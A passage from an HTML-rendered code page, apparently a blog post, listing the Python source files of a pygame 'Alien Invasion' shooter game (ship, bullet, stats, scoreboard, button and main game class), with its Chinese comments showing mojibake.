self.screen_rect = self.screen.get_rect()                                        <span class="comment">#å¾—åˆ°screençš„çŸ©å½¢åŒºåŸŸ</span></span><br><span class="line">        self.rect.midbottom = self.screen_rect.midbottom                      <span class="comment"># å°†é£èˆ¹æ”¾åˆ°åº•éƒ¨ä¸­å¤®</span></span><br><span class="line">        self.x = <span class="built_in">float</span>(self.rect.x)                                                                        <span class="comment">#å­˜å‚¨é£æœºçš„ä½ç½®</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># åœ¨æŒ‡å®šä½ç½®ç»˜åˆ¶å°é£æœº</span></span><br><span class="line">        self.screen.blit(self.image, self.rect)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span>                                                                                                       <span class="comment">#æ ¹æ®è¿åŠ¨æ ‡è®°æ›´æ–°é£èˆ¹çš„ä½ç½®</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:            <span class="comment">#å¦‚æœé£èˆ¹å‘å³ç§»åŠ¨æ²¡æœ‰è¶…è¿‡è¾¹ç•Œï¼Œé£èˆ¹å°±å‘å³ç§»åŠ¨xï¼ˆxå¤§å°æ ¹æ®è®¾ç½®é‡Œé¢çš„é£èˆ¹é€Ÿåº¦ï¼‰</span></span><br><span class="line">            self.x += self.settings.ship_speed</span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:                                                        <span class="comment">#å¦‚æœé£èˆ¹å‘å·¦ç§»åŠ¨æ²¡æœ‰è¶…è¿‡è¾¹ç•Œï¼Œé£èˆ¹å°±å‘å·¦ç§»åŠ¨x </span></span><br><span class="line">            self.x -= self.settings.ship_speed </span><br><span class="line">            self.rect.x = self.x                                                                                             <span class="comment">#æ›´æ–°é£èˆ¹ä½ç½®</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">center_ship</span>(<span class="params">self</span>):</span>                                                                                 <span class="comment">#å°†é£èˆ¹å±…ä¸­</span></span><br><span class="line">        self.rect.midbottom = self.screen_rect.midbottom                       <span class="comment">#å®šä¹‰é£èˆ¹å±…ä¸­ä½ç½®ä¸ºå±å¹•ä¸‹é¢åº•éƒ¨ä¸­å¤®</span></span><br><span class="line">        self.x = <span class="built_in">float</span>(self.rect.x)                                                                         <span class="comment">#æ›´æ–°é£èˆ¹ä½ç½®</span></span><br></pre></td></tr></table></figure><h1 id="bullet-py"><a href="#bullet-py" class="headerlink" title="bullet.py"></a>bullet.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span>(<span class="params">Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span>                                                                   <span class="comment">#åœ¨èˆ°èˆ¹çš„å½“å‰ä½ç½®åˆ›å»ºä¸€ä¸ªå­å¼¹å¯¹è±¡</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()                                                                                   <span class="comment">#ç»§æ‰¿</span></span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        self.color = self.settings.bullet_color</span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, self.settings.bullet_width,self.settings.bullet_height)              <span class="comment">#åˆ›å»ºä¸€ä¸ªå­å¼¹å¹¶æ”¾ç½®åœ¨æ­£ç¡®ä½ç½®</span></span><br><span class="line">        self.rect.midtop = ai_game.ship.rect.midtop</span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)                                                                          <span class="comment">#å­˜å‚¨å­å¼¹çš„ä½ç½®</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span>                                                                                            <span class="comment">#æ›´æ–°å­å¼¹ä½ç½®</span></span><br><span class="line">        self.y -= self.settings.bullet_speed</span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_bullet</span>(<span class="params">self</span>):</span>                                                                                   <span class="comment">#åœ¨å±å¹•ä¸Šç»˜åˆ¶å­å¼¹</span></span><br><span class="line">        pygame.draw.rect(self.screen, self.color, self.rect)</span><br></pre></td></tr></table></figure><h1 id="game-stats-py"><a href="#game-stats-py" class="headerlink" title="game_stats.py"></a>game_stats.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameStats</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Track statistics for Alien Invasion.&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Initialize statistics.&quot;&quot;&quot;</span></span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        self.reset_stats()</span><br><span class="line">        self.game_active = <span class="literal">False</span>                                           <span class="comment">#è‡ªåŠ¨å¼€å¯æ¸¸æˆ</span></span><br><span class="line">        self.high_score = <span class="number">0</span>       <span class="comment">#é«˜åˆ†æ°¸è¿œä¸è¦é‡ç½®ã€‚</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_stats</span>(<span class="params">self</span>):</span>    <span class="comment">#åˆå§‹åŒ–æ¸¸æˆæ•°æ®</span></span><br><span class="line">        self.ships_left = self.settings.ship_limit</span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.level = <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="scoreboard-py"><a href="#scoreboard-py" class="headerlink" title="scoreboard.py"></a>scoreboard.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Group</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scoreboard</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span>                       <span class="comment">#åˆå§‹åŒ–å¾—åˆ†å±æ€§</span></span><br><span class="line">        self.ai_game = ai_game</span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.screen_rect = self.screen.get_rect()</span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        </span><br><span class="line">        self.stats = ai_game.stats                                      <span class="comment">#å¾—åˆ†ä¿¡æ¯çš„å­—ä½“è®¾ç½®</span></span><br><span class="line">        self.text_color = (<span class="number">30</span>, <span class="number">30</span>, <span class="number">30</span>)</span><br><span class="line">        self.font = pygame.font.SysFont(<span class="literal">None</span>, <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">        self.prep_score()                                                       <span class="comment">#åˆå§‹ä¹è°±å›¾åƒ</span></span><br><span class="line">        self.prep_high_score()</span><br><span class="line">        self.prep_level()</span><br><span class="line">        self.prep_ships()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_score</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Turn the score into a rendered image.&quot;&quot;&quot;</span></span><br><span class="line">        rounded_score = <span class="built_in">round</span>(self.stats.score, -<span class="number">1</span>)</span><br><span class="line">        score_str = <span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(rounded_score)</span><br><span class="line">        self.score_image = self.font.render(score_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">        </span><br><span class="line">        self.score_rect = self.score_image.get_rect()               <span class="comment">#åœ¨å±å¹•å³ä¸Šæ–¹æ˜¾ç¤ºåˆ†æ•°</span></span><br><span class="line">        self.score_rect.right = self.screen_rect.right - <span class="number">20</span></span><br><span class="line">        self.score_rect.top = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_high_score</span>(<span class="params">self</span>):</span>                                                     <span class="comment">#å°†é«˜åˆ†è½¬æ¢ä¸ºå›¾åƒ</span></span><br><span class="line">        high_score = <span class="built_in">round</span>(self.stats.high_score, -<span class="number">1</span>)</span><br><span class="line">        high_score_str = <span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(high_score)</span><br><span class="line">        self.high_score_image = self.font.render(high_score_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">            </span><br><span class="line">        self.high_score_rect = self.high_score_image.get_rect()          <span class="comment">#å°†é«˜åˆ†å±…ä¸­æ˜¾ç¤ºåœ¨å±å¹•é¡¶éƒ¨</span></span><br><span class="line">        self.high_score_rect.centerx = self.screen_rect.centerx</span><br><span class="line">        self.high_score_rect.top = self.score_rect.top</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_level</span>(<span class="params">self</span>):</span>                                                                      <span class="comment">#å°†ç­‰çº§è½¬æ¢ä¸ºæ¸²æŸ“çš„å›¾åƒã€‚</span></span><br><span class="line">        level_str = <span class="built_in">str</span>(self.stats.level)</span><br><span class="line">        self.level_image = self.font.render(level_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">    </span><br><span class="line">        self.level_rect = self.level_image.get_rect()                 <span class="comment">#å°†çº§åˆ«å®šä½åœ¨åˆ†æ•°ä¸‹æ–¹</span></span><br><span class="line">        self.level_rect.right = self.score_rect.right</span><br><span class="line">        self.level_rect.top = self.score_rect.bottom + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_ships</span>(<span class="params">self</span>):</span>                                                                 <span class="comment">#æ˜¾ç¤ºç”Ÿå‘½å€¼</span></span><br><span class="line">        self.ships = Group()</span><br><span class="line">        <span class="keyword">for</span> ship_number <span class="keyword">in</span> <span class="built_in">range</span>(self.stats.ships_left):</span><br><span class="line">            ship = Ship(self.ai_game)</span><br><span class="line">            ship.rect.x = <span class="number">10</span> + ship_number * ship.rect.width</span><br><span class="line">            ship.rect.y = <span class="number">10</span></span><br><span class="line">            self.ships.add(ship)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_high_score</span>(<span class="params">self</span>):</span>                                               <span class="comment">#æ£€æŸ¥æ˜¯å¦æœ‰æ–°é«˜åˆ†</span></span><br><span class="line">        <span class="keyword">if</span> self.stats.score &gt; self.stats.high_score:</span><br><span class="line">            self.stats.high_score = self.stats.score</span><br><span class="line">            self.prep_high_score()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_score</span>(<span class="params">self</span>):</span>                                                            <span class="comment">#åœ¨å±å¹•ä¸Šé¢ç»˜åˆ¶åˆ†æ•°å’Œå…¶å®ƒä¿¡æ¯</span></span><br><span class="line">        self.screen.blit(self.score_image, self.score_rect)</span><br><span class="line">        self.screen.blit(self.high_score_image, self.high_score_rect)</span><br><span class="line">        self.screen.blit(self.level_image, self.level_rect)</span><br><span class="line">        self.ships.draw(self.screen)</span><br></pre></td></tr></table></figure><h1 id="botto-py"><a href="#botto-py" class="headerlink" title="botto.py"></a>botto.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>:</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game, msg</span>):</span>                 <span class="comment">#åˆå§‹åŒ–</span></span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.screen_rect = self.screen.get_rect()</span><br><span class="line">        </span><br><span class="line">        self.width, self.height = <span class="number">200</span>, <span class="number">50</span>               <span class="comment">#è®¾ç½®æŒ‰é’®çš„å°ºå¯¸å’Œå±æ€§</span></span><br><span class="line">        self.button_color = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">        self.text_color = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">        self.font = pygame.font.SysFont(<span class="literal">None</span>, <span class="number">48</span>)</span><br><span class="line">        </span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, self.width, self.height)    <span class="comment">#æ”¾ç½®playå›¾æ ‡</span></span><br><span class="line">        self.rect.center = self.screen_rect.center</span><br><span class="line">        </span><br><span class="line">        self._prep_msg(msg)                                  <span class="comment">#è¯¥æŒ‰é’®ä»…éœ€å‡†å¤‡ä¸€æ¬¡</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_prep_msg</span>(<span class="params">self, msg</span>):</span>                              <span class="comment">#å°†å…¶è½¬æ¢ä¸ºæ¸²æŸ“çš„å›¾åƒï¼Œç„¶ååœ¨æŒ‰é’®ä¸Šå±…ä¸­æ˜¾ç¤ºæ–‡æœ¬ã€‚</span></span><br><span class="line">        self.msg_image = self.font.render(msg, <span class="literal">True</span>, self.text_color,</span><br><span class="line">                self.button_color)</span><br><span class="line">        self.msg_image_rect = self.msg_image.get_rect()</span><br><span class="line">        self.msg_image_rect.center = self.rect.center</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_button</span>(<span class="params">self</span>):</span>                                     <span class="comment">#åœ¨å±å¹•ä¸Šé¢ç»˜åˆ¶</span></span><br><span class="line">        self.screen.fill(self.button_color, self.rect)</span><br><span class="line">        self.screen.blit(self.msg_image, self.msg_image_rect)</span><br></pre></td></tr></table></figure><h1 id="é‡æ„alien-invasion-py"><a href="#é‡æ„alien-invasion-py" class="headerlink" title="é‡æ„alien_invasion.py"></a>é‡æ„alien_invasion.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> game_stats <span class="keyword">import</span> GameStats</span><br><span class="line"><span class="keyword">from</span> scoreboard <span class="keyword">import</span> Scoreboard</span><br><span class="line"><span class="keyword">from</span> button <span class="keyword">import</span> Button</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">from</span> bullet <span class="keyword">import</span> Bullet</span><br><span class="line"><span class="keyword">from</span> alien <span class="keyword">import</span> Alien</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;ç®¡ç†æ¸¸æˆèµ„æºå’Œè¡Œä¸ºçš„ç±»&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlienInvasion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆå§‹åŒ–æ¸¸æˆå¹¶åˆ›å»ºæ¸¸æˆèµ„æº&quot;&quot;&quot;</span></span><br><span class="line">        pygame.init()</span><br><span class="line">        self.settings = Settings()</span><br><span class="line"></span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">0</span>, <span class="number">0</span>), pygame.FULLSCREEN)</span><br><span class="line">        self.settings.screen_width = self.screen.get_rect().width</span><br><span class="line">        self.settings.screen_height = self.screen.get_rect().height</span><br><span class="line">        pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºä¸€ä¸ªå®ä¾‹æ¥å­˜å‚¨æ¸¸æˆç»Ÿè®¡ä¿¡æ¯ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªè®°åˆ†æ¿ã€‚&quot;&quot;&quot;</span></span><br><span class="line">        self.stats = GameStats(self)</span><br><span class="line">        self.sb = Scoreboard(self)</span><br><span class="line"></span><br><span class="line">        self.ship = Ship(self)</span><br><span class="line">        self.bullets = pygame.sprite.Group()</span><br><span class="line">        self.aliens = pygame.sprite.Group()</span><br><span class="line"></span><br><span class="line">        self._create_fleet()</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;è®¾ç½®play&quot;&quot;&quot;</span></span><br><span class="line">        self.play_button = Button(self, <span class="string">&quot;Play&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¼€å¯æ¸¸æˆå¹¶å¾ªç¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_game</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self._check_events()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.stats.game_active:</span><br><span class="line">                self.ship.update()</span><br><span class="line">                self._update_bullets()</span><br><span class="line">                self._update_aliens()</span><br><span class="line"></span><br><span class="line">            self._update_screen()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å“åº”æŒ‰é”®å’Œé¼ æ ‡äº‹ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_events</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">                sys.exit()</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYDOWN:</span><br><span class="line">                self._check_keydown_events(event)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYUP:</span><br><span class="line">                self._check_keyup_events(event)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.MOUSEBUTTONDOWN:</span><br><span class="line">                mouse_pos = pygame.mouse.get_pos()</span><br><span class="line">                self._check_play_button(mouse_pos)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å½“ç©å®¶å•å‡»æ’­æ”¾æ—¶å¼€å§‹æ–°æ¸¸æˆ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_play_button</span>(<span class="params">self, mouse_pos</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Start a new game when the player clicks Play.&quot;&quot;&quot;</span></span><br><span class="line">        button_clicked = self.play_button.rect.collidepoint(mouse_pos)</span><br><span class="line">        <span class="keyword">if</span> button_clicked <span class="keyword">and</span> <span class="keyword">not</span> self.stats.game_active:</span><br><span class="line">            <span class="comment">#é‡ç½®æ¸¸æˆè®¾ç½®</span></span><br><span class="line">            self.settings.initialize_dynamic_settings()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#é‡ç½®æ¸¸æˆç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">            self.stats.reset_stats()</span><br><span class="line">            self.stats.game_active = <span class="literal">True</span></span><br><span class="line">            self.sb.prep_score()</span><br><span class="line">            self.sb.prep_level()</span><br><span class="line">            self.sb.prep_ships()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#æ‘†è„±ä»»ä½•å‰©ä½™çš„å¤–æ˜Ÿäººå’Œå­å¼¹</span></span><br><span class="line">            self.aliens.empty()</span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#å»ºç«‹ä¸€ä¸ªæ–°çš„èˆ°é˜Ÿå¹¶é›†ä¸­èˆ°èˆ¹</span></span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.ship.center_ship()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#éšè—é¼ æ ‡å…‰æ ‡</span></span><br><span class="line">            pygame.mouse.set_visible(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å“åº”æŒ‰é”®&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_keydown_events</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            self.ship.moving_right = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            self.ship.moving_left = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_q:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_SPACE:</span><br><span class="line">            self._fire_bullet()</span><br><span class="line">    </span><br><span class="line">    <span 